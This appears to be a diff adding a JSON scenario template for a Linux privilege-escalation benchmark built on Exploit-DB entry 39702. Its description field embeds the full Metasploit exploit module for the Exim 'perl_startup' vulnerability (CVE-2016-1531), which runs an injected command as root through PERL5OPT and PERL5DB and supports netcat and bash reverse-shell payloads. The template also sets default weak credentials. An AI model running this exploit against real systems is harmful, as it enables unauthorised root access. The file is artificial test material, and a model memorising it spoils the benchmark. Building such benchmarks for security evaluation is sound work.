@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_39702",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: Exim - 'perl_startup' Local Privilege Escalation (Metasploit) (CVE-2016-1531)\n\nExploit source code (39702.rb):\n```\n##\n# This module requires Metasploit: http://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n\n  Rank = ExcellentRanking\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'            => 'Exim \"perl_startup\" Privilege Escalation',\n      'Description'     => %q{\n        This module exploits a Perl injection vulnerability in Exim < 4.86.2\n        given the presence of the \"perl_startup\" configuration parameter.\n      },\n      'Author'          => [\n        'Dawid Golunski', # Vulnerability discovery\n        'wvu'             # Metasploit module\n      ],\n      'References'      => [\n        %w{CVE 2016-1531},\n        %w{EDB 39549},\n        %w{URL http://www.exim.org/static/doc/CVE-2016-1531.txt}\n      ],\n      'DisclosureDate'  => 'Mar 10 2016',\n      'License'         => MSF_LICENSE,\n      'Platform'        => 'unix',\n      'Arch'            => ARCH_CMD,\n      'SessionTypes'    => %w{shell meterpreter},\n      'Privileged'      => true,\n      'Payload'         => {\n        'BadChars'      => \"\\x22\\x27\", # \" and '\n        'Compat'        => {\n          'PayloadType' => 'cmd cmd_bash',\n          'RequiredCmd' => 'generic netcat netcat-e bash-tcp telnet'\n        }\n      },\n      'Targets'         => [\n        ['Exim < 4.86.2', {}]\n      ],\n      'DefaultTarget'   => 0\n    ))\n  end\n\n  def check\n    if exploit('whoami') == 'root'\n      CheckCode::Vulnerable\n    else\n      CheckCode::Safe\n    end\n  end\n\n  def exploit(c = payload.encoded)\n    # PERL5DB technique from http://perldoc.perl.org/perlrun.html\n    cmd_exec(%Q{PERL5OPT=-d PERL5DB='exec \"#{c}\"' exim -ps 2>&-})\n  end\n\nend\n```",
+  "cve": "CVE-2016-1531",
+  "exploitdb_id": "39702",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_39702",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
